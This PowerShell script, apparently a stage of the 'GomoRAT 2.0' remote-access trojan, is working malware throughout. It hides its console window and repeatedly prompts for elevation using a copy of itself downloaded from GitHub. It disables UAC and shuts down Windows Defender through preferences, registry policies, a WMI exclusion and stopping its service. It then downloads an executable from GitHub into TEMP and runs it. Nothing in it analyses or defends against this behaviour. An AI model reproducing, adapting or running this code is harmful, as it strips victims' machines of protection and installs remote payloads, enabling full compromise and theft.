# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}

# ===== ADMIN CHECK + ELEVATION =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $tmp = Join-Path $env:TEMP "_svc.ps1"
    (iwr "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
    while ($true) {
        $p = Start-Process powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
        if ($p -ne $null) { [Environment]::Exit(0) }
        Start-Sleep -Seconds 2
    }
}

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

# GomoRAT 2.0 — Windows Defender Disable (Full Method)
# Extracted from Action.dll + Explorer.dll + Client.exe
# Requires: Administrator privileges

# --- Config ---
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"
$SignatureUpdatesKey   = "Signature Updates"
$SpynetKey             = "Spynet"

# --- Phase 1: Set-MpPreference direct ---
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
} catch {}

# --- Phase 2: Registry Policy Kill Chain ---
$flag = Get-ItemProperty -Path $DefenderPath -Name "WindowsDefenderIsDisabledPermanently" -ErrorAction SilentlyContinue
if (-not $flag) {
    if (-not (Test-Path $DefenderPath)) {
        New-Item -Path $DefenderPath -Force | Out-Null
    }

    New-ItemProperty -Path $DefenderPath -Name "WindowsDefenderIsDisabledPermanently" -Value 1 -PropertyType Dword -Force | Out-Null

    if (-not (Test-Path "$DefenderPath\$RealTimeProtectionKey")) {
        New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force | Out-Null
    }
    if (-not (Test-Path "$DefenderPath\$SignatureUpdatesKey")) {
        New-Item -Path "$DefenderPath\$SignatureUpdatesKey" -Force | Out-Null
    }
    if (-not (Test-Path "$DefenderPath\$SpynetKey")) {
        New-Item -Path "$DefenderPath\$SpynetKey" -Force | Out-Null
    }

    @{
        "AllowFastServiceStartup"      = 1
        "DisableAntiSpyware"           = 1
        "DisableAntiVirus"             = 1
        "DisableRoutinelyTakingAction" = 1
        "DisableSpecialRunningModes"   = 1
        "ServiceKeepAlive"             = 1
        "DisableRealtimeMonitoring"    = 1
    }.GetEnumerator() | ForEach-Object {
        New-ItemProperty -Path $DefenderPath -Name $_.Key -Value $_.Value -PropertyType Dword -Force | Out-Null
    }

    @{
        "DisableBehaviorMonitoring"   = 1
        "DisableOnAccessProtection"   = 1
        "DisableRealtimeMonitoring"   = 1
        "DisableScanOnRealtimeEnable" = 1
    }.GetEnumerator() | ForEach-Object {
        New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name $_.Key -Value $_.Value -PropertyType Dword -Force | Out-Null
    }

    New-ItemProperty -Path "$DefenderPath\$SignatureUpdatesKey" -Name "ForceUpdateFromMU" -Value 1 -PropertyType Dword -Force | Out-Null
    New-ItemProperty -Path "$DefenderPath\$SpynetKey" -Name "DisableBlockAtFirstSeen" -Value 1 -PropertyType Dword -Force | Out-Null
}

# --- Phase 3: WMI Exclusion Path ---
try {
    $wmi = Get-CimInstance -Namespace "root\Microsoft\Windows\Defender" -ClassName "MSFT_MpPreference" -ErrorAction Stop
    $computerId = ($wmi | Select-Object -First 1).ComputerId
    if ($computerId) {
        $installDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
        Invoke-CimMethod -Namespace "root\Microsoft\Windows\Defender" -ClassName "MSFT_MpPreference" -MethodName "AddExclusion" -Arguments @{
            ComputerId    = $computerId
            ExclusionPath = $installDir
        } | Out-Null
    }
} catch {}

# --- Phase 4: Service Kill ---
try {
    sc.exe config WinDefend start= disabled 2>$null | Out-Null
    sc.exe stop WinDefend 2>$null | Out-Null
} catch {}


$p="$env:TEMP\Comand.exe"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/user.exe" -OutFile $p; Start-Process $p
